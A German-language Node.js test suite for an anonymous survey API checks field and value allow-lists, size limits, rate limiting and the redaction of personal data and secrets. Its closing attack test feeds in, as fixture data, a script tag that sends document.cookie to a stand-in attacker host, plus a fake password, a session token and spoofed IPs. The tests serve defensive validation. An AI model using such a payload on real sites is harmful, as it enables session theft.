/*
  Die Umfrage.

  Sie ist der einzige schreibende Weg ohne Sitzung. Was sonst die Anmeldung
  leistet — jemanden ueberhaupt hereinlassen —, leisten hier nur zwei Dinge:
  die Erlaubnisliste und die Drossel. Also pruefen diese Tests genau die
  beiden, und zwar von aussen ueber HTTP, nicht an der Funktion vorbei.

  Der wichtigste Test steht ganz unten und heisst „ein Angriff": Er wirft
  alles hinein, was in einer anonymen Umfrage nie landen darf, und weist
  nach, dass es weder in der Tabelle noch im Protokoll wieder auftaucht.
*/

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { erzeugeDrossel } from '../src/server.mjs';
import { TABELLE_UMFRAGE } from '../src/speicher.mjs';
import { saeubereAbgabe, saeubereFreitext } from '../src/umfrage.mjs';
import { starteTestdienst, fangeProtokoll } from './hilfe.mjs';

/** Alle Zeilen der Umfragetabelle, ueber alle Tagespartitionen hinweg. */
async function abgaben(speicher) {
    const raus = [];
    for await (const zeile of speicher.listeAlle(TABELLE_UMFRAGE)) raus.push(zeile);
    return raus;
}

const VOLL = {
    heute: 'bastelei',
    fehlt: 'andere-stimmungen',
    preis: '69',
    vorschlag: 'Ein Regler fuer die Stimmung, ohne Treiber.',
    sprache: 'de',
};

// ── Der gewoehnliche Fall ───────────────────────────────────────────

test('eine gueltige Abgabe wird gespeichert', async () => {
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        const antwort = await d.rufe('POST', '/api/umfrage', VOLL);
        assert.equal(antwort.status, 204);

        const zeilen = await abgaben(d.speicher);
        assert.equal(zeilen.length, 1);
        assert.equal(zeilen[0].heute, 'bastelei');
        assert.equal(zeilen[0].fehlt, 'andere-stimmungen');
        assert.equal(zeilen[0].preis, '69');
        assert.equal(zeilen[0].sprache, 'de');
        assert.equal(zeilen[0].vorschlag, 'Ein Regler fuer die Stimmung, ohne Treiber.');

        const zeile = p.zeilen.find((z) => z.art === 'umfrage');
        assert.equal(zeile.ergebnis, 'ok');
        assert.equal(zeile.anzahl, 5);
        // Die Antworten selbst gehoeren NICHT ins Protokoll, nur ihre Zahl.
        assert.equal(JSON.stringify(p.zeilen).includes('bastelei'), false);
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

test('alle vier Fragen sind freiwillig — eine einzelne Antwort genuegt', async () => {
    // Wer drei Fragen ueberspringt, schickt sie gar nicht mit. Waere ein
    // fehlendes Feld ein Fehler, verloeren wir genau die Leute, die nur die
    // Preisfrage beantworten wollten — und die ist der Grund fuer das Ganze.
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        assert.equal((await d.rufe('POST', '/api/umfrage', { preis: '99' })).status, 204);
        const zeilen = await abgaben(d.speicher);
        assert.equal(zeilen.length, 1);
        assert.equal(zeilen[0].preis, '99');
        assert.equal(zeilen[0].heute, undefined);
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

test('zwei Abgaben ergeben zwei Zeilen ohne gemeinsamen Faden', async () => {
    /*
      Der Zeilenschluessel ist zufaellig, nicht laufend. Waere er laufend,
      saehe man, welche Antwort auf welche folgte — und bei einer Umfrage mit
      wenigen Teilnehmern ist eine Reihenfolge fast schon eine Kennung.
    */
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        await d.rufe('POST', '/api/umfrage', { preis: '0' });
        await d.rufe('POST', '/api/umfrage', { preis: '39' });

        const zeilen = await abgaben(d.speicher);
        assert.equal(zeilen.length, 2);
        assert.notEqual(zeilen[0].rowKey, zeilen[1].rowKey);
        assert.ok(/^[0-9a-f-]{36}$/.test(zeilen[0].rowKey), 'Zeilenschluessel: ' + zeilen[0].rowKey);
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

// ── Die Erlaubnisliste ──────────────────────────────────────────────

test('ein unbekanntes Feld wird verworfen, nicht gespeichert', async () => {
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        const antwort = await d.rufe('POST', '/api/umfrage', {
            preis: '39',
            // Alles hier drunter steht in keiner Erlaubnisliste und darf
            // deshalb nirgends ankommen — auch nicht „nur zur Sicherheit".
            ip: '203.0.113.47',
            kontoId: 'c'.repeat(32),
            sitzung: 'abcdefabcdefabcdefabcdef',
            mail: 'neugierig@example.org',
            partitionKey: 'gekapert',
            etag: 'W/"1"',
        });
        assert.equal(antwort.status, 204);

        const zeilen = await abgaben(d.speicher);
        assert.equal(zeilen.length, 1);
        assert.deepEqual(
            Object.keys(zeilen[0]).filter((k) => !['partitionKey', 'rowKey', 'etag'].includes(k)).sort(),
            ['preis']);
        // Auch den Partitionsschluessel darf der Aufrufer nicht setzen: Der
        // Tag kommt vom Server, sonst schreibt jemand in eine Partition
        // seiner Wahl.
        assert.notEqual(zeilen[0].partitionKey, 'gekapert');
        assert.ok(/^\d{4}-\d{2}-\d{2}$/.test(zeilen[0].partitionKey));
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

test('ein bekanntes Feld mit unbekanntem Wert kommt nicht durch', () => {
    /*
      Der Unterschied zu einer blossen Feldliste. Ein Filter, der nur
      `preis` durchlaesst, laesst `preis: '<script>'` durch. Eine
      geschlossene Werteliste kann das gar nicht.
    */
    assert.deepEqual(saeubereAbgabe({ preis: '4711' }), {});
    assert.deepEqual(saeubereAbgabe({ heute: 'ausgedacht' }), {});
    assert.deepEqual(saeubereAbgabe({ sprache: 'kl' }), {});
    assert.deepEqual(saeubereAbgabe({ preis: { toString: () => '39' } }), {});
    assert.deepEqual(saeubereAbgabe({ preis: ['39'] }), {});
    // Die Zahl 99 und die Zeichenkette '99' sind dieselbe Antwort.
    assert.deepEqual(saeubereAbgabe({ preis: 99 }), { preis: '99' });
});

test('eine Abgabe, von der nichts uebrig bleibt, wird nicht abgelegt', async () => {
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        const antwort = await d.rufe('POST', '/api/umfrage', { heute: 'ausgedacht', quatsch: 1 });
        assert.equal(antwort.status, 400);
        assert.equal(antwort.daten.fehler, 'nichts_erkannt');
        assert.equal((await abgaben(d.speicher)).length, 0);

        const zeile = p.zeilen.find((z) => z.art === 'umfrage');
        assert.equal(zeile.ergebnis, 'abgelehnt');
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

// ── Kaputte und uebergrosse Anfragen ────────────────────────────────

test('ein zu grosser Rumpf bricht ab, ohne etwas abzulegen', async () => {
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        // Weit ueber HOECHSTER_KOERPER (32 KiB). Der Freitext des Formulars
        // ist auf 600 Zeichen begrenzt; wer 200.000 schickt, meint es nicht
        // gut.
        const antwort = await d.rufe('POST', '/api/umfrage', {
            preis: '39', vorschlag: 'A'.repeat(200_000),
        });
        assert.equal(antwort.status, 413);
        assert.equal(antwort.daten.fehler, 'zu_gross');
        assert.equal((await abgaben(d.speicher)).length, 0);
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

test('kaputtes JSON gibt 400, keinen Absturz', async () => {
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        const antwort = await fetch(d.basis + '/api/umfrage', {
            method: 'POST',
            headers: { Origin: 'https://iyambae.fm', 'Content-Type': 'application/json' },
            body: '{"preis": "39", kaputt',
        });
        assert.equal(antwort.status, 400);
        assert.equal((await antwort.json()).fehler, 'kein_json');
        assert.equal((await abgaben(d.speicher)).length, 0);

        // Und der Dienst lebt weiter — das ist die eigentliche Zusicherung.
        assert.equal((await d.rufe('POST', '/api/umfrage', { preis: '39' })).status, 204);
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

test('ein Rumpf, der gar kein Objekt ist, wird abgewiesen', async () => {
    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        for (const rumpf of ['[1,2,3]', '"nur ein Text"', 'null', '17']) {
            const antwort = await fetch(d.basis + '/api/umfrage', {
                method: 'POST',
                headers: { Origin: 'https://iyambae.fm', 'Content-Type': 'application/json' },
                body: rumpf,
            });
            assert.equal(antwort.status, 400, 'Rumpf: ' + rumpf);
        }
        assert.equal((await abgaben(d.speicher)).length, 0);
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

// ── Die Drossel, die einzige Verteidigung dieses Weges ──────────────

test('die Drossel greift und antwortet 429 mit Retry-After', async () => {
    const p = fangeProtokoll();
    const d = await starteTestdienst({ drossel: erzeugeDrossel() });
    try {
        const rufe = () => d.rufe('POST', '/api/umfrage', { preis: '39' },
            { kopf: { 'X-Forwarded-For': '203.0.113.9' } });

        let gedrosselt = null;
        let durch = 0;
        for (let i = 0; i < 14 && !gedrosselt; i++) {
            const antwort = await rufe();
            if (antwort.status === 429) gedrosselt = antwort;
            else durch++;
        }

        assert.ok(gedrosselt, 'die Drossel hat gar nicht gegriffen');
        assert.equal(gedrosselt.daten.fehler, 'zu_viele_versuche');
        const wieder = Number(gedrosselt.kopf.get('retry-after'));
        assert.ok(Number.isFinite(wieder) && wieder >= 1, 'Retry-After fehlt oder ist Unsinn');

        // Zehn je Netz und halber Stunde — die Zahl von /api/passwort/vergessen.
        assert.equal(durch, 10);
        // Und was gedrosselt wurde, wurde auch nicht abgelegt.
        assert.equal((await abgaben(d.speicher)).length, 10);

        const zeile = p.zeilen.find((z) => z.art === 'drossel');
        assert.equal(zeile.achse, 'netz');
        // Auch die Drosselzeile nennt kein Netz und keine Adresse.
        assert.equal(JSON.stringify(p.zeilen).includes('203.0.113'), false);
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

// ── Der Angriff ─────────────────────────────────────────────────────

test('ein Angriff: nichts davon landet in der Tabelle oder im Protokoll', async () => {
    /*
      Alles auf einmal, so wie es kaeme: erfundene Felder mit Adresse und
      Passwort darin, ein Skript-Tag, ein Sitzungsschluessel, eine
      ueberlange Zeichenkette — und dasselbe noch einmal IM Freitext, wo es
      keine Werteliste gibt und deshalb wirklich gesaeubert werden muss.
    */
    const ADRESSE = 'opfer.person@example.org';
    const PASSWORT = 'Tr0ub4dor3xKorrektPferdeKlammer7';
    const SKRIPT = '<script>fetch("//boese.example/"+document.cookie)</script>';
    const MARKE = 'sitzungsmarke-8f3a2b1c9d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a';
    const LANG = 'Z'.repeat(5_000);

    const p = fangeProtokoll();
    const d = await starteTestdienst();
    try {
        const antwort = await d.rufe('POST', '/api/umfrage', {
            heute: 'handy',
            preis: '19',
            sprache: 'de',
            vorschlag: `Schreibt mir an ${ADRESSE} ${SKRIPT} mein Passwort ist `
                + `${PASSWORT} und die Marke ${MARKE} ${LANG}`,
            // Erfundene Felder, jedes mit etwas Giftigem darin.
            ip: '203.0.113.47',
            adresse: ADRESSE,
            passwort: PASSWORT,
            cookie: MARKE,
            'X-Forwarded-For': '198.51.100.3',
            __proto__x: SKRIPT,
        });
        assert.equal(antwort.status, 204);

        const zeilen = await abgaben(d.speicher);
        assert.equal(zeilen.length, 1);

        const inDerTabelle = JSON.stringify(zeilen);
        const imProtokoll = JSON.stringify(p.zeilen);

        for (const [was, gift] of Object.entries({
            Adresse: ADRESSE, Passwort: PASSWORT, Skript: '<script', Marke: MARKE,
            IP: '203.0.113.47', 'zweite IP': '198.51.100.3',
        })) {
            assert.equal(inDerTabelle.includes(gift), false, was + ' steht in der Tabelle');
            assert.equal(imProtokoll.includes(gift), false, was + ' steht im Protokoll');
        }

        // Die ueberlange Zeichenkette ist nicht bloss abwesend, sondern
        // gekuerzt: Sonst waere die Tabelle das Ablagefach eines Fremden.
        assert.ok(zeilen[0].vorschlag.length <= 600, 'Laenge: ' + zeilen[0].vorschlag.length);
        assert.equal(inDerTabelle.includes('Z'.repeat(601)), false);

        // Nur die erlaubten Felder haben ueberlebt.
        assert.deepEqual(
            Object.keys(zeilen[0]).filter((k) => !['partitionKey', 'rowKey', 'etag'].includes(k)).sort(),
            ['heute', 'preis', 'sprache', 'vorschlag']);

        // Und der Satz drumherum ist erhalten geblieben — das Schwaerzen
        // soll die Antwort retten, nicht sie wegwerfen.
        assert.ok(zeilen[0].vorschlag.startsWith('Schreibt mir an entfernt:adresse'),
            'Freitext: ' + zeilen[0].vorschlag.slice(0, 80));
    } finally {
        await d.schliesse();
        p.zurueck();
    }
});

test('der Freitext behaelt den Satz und verliert das Gift', () => {
    // Was gefangen wird ...
    assert.equal(saeubereFreitext('mail an a.b@c.de bitte'), 'mail an entfernt:adresse bitte');
    assert.equal(saeubereFreitext('nimm <b>das</b>'), 'nimm bdas/b');
    assert.equal(saeubereFreitext('key aB3xY9zQ7wE1rT5yU2iO0p'), 'key entfernt:geheimnis');
    assert.equal(saeubereFreitext('a b\tc   d'), 'a b c d');

    // ... und was ausdruecklich NICHT gefangen wird: ein langes deutsches
    // Wort ist kein Geheimnis. Ohne die Ziffernbedingung waere es eines,
    // und die Antwort damit unlesbar.
    assert.equal(saeubereFreitext('Donaudampfschifffahrtsgesellschaft'),
        'Donaudampfschifffahrtsgesellschaft');

    // Leer bleibt leer — daraus entsteht kein Feld.
    assert.equal(saeubereFreitext('   '), null);
    assert.equal(saeubereFreitext(42), null);
    assert.equal(saeubereFreitext(undefined), null);
});
